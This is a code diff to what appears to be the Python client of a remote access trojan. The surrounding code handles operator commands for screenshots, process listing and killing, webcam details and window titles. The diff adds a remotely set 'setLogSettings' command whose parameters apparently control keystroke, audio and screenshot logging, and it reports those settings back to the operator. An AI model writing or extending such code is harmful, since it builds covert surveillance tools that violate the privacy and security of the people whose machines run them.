@@ -175,6 +175,25 @@ while 1:
                     return variables
 
 
+            def set_info(values):
+                config = init()
+                if values.has_key('kts'):
+                    config['kts'] = values['kts']
+                if values.has_key('kt'):
+                    config['kt'] = values['kt']
+                if values.has_key('ats'):
+                    config['ats'] = values['ats']
+                if values.has_key('at'):
+                    config['at'] = values['at']
+                if values.has_key('sts'):
+                    config['sts'] = values['sts']
+                if values.has_key('std'):
+                    config['std'] = values['std']
+                if values.has_key('st'):
+                    config['st'] = values['st']
+                open('info.nfo', 'w').write(str(config))
+
+
             def get_date_time():
                 now = datetime.datetime.now()
                 year = now.year
@@ -419,6 +438,7 @@ while 1:
 
             def check_info():
                 global UNLOCKED
+                config = init()
                 return {
                     'os_type':          os_type,
                     'os':               os_name,
@@ -429,6 +449,13 @@ while 1:
                     'webcamera_device': web_camera_input,
                     'window_title':     get_window_title(),
                     'key':              ID,
+                    'kts':              config['kts'],
+                    'kt':               config['kt'],
+                    'ats':              config['ats'],
+                    'at':               config['at'],
+                    'sts':              config['sts'],
+                    'std':              config['std'],
+                    'st':               config['st'],
                 }
 
 
@@ -693,6 +720,11 @@ while 1:
                                             elif data['mode'] == 'processesMode':
                                                 output = get_processes_list()
 
+                                            # Set Log Settings
+                                            elif data['mode'] == 'setLogSettings':
+                                                set_info(data['payload'])
+                                                continue
+
                                             # Terminate Process
                                             elif data['mode'] == 'terminateProcess':
                                                 terminateProcess(data['payload'])
@@ -725,6 +757,11 @@ while 1:
                                     data_send('notAuthorized', 'notAuthorized', session_id=data['session_id'])
 
                             # Locked Client Functions
+                            # Set Log Settings
+                            elif data['mode'] == 'setLogSettings':
+                                set_info(data['payload'])
+                                continue
+
                             # Desktop Screenshot
                             elif data['mode'] == 'getScreen':
                                 data_send(get_screenshot(), 'getScreen', session_id=data['session_id'])
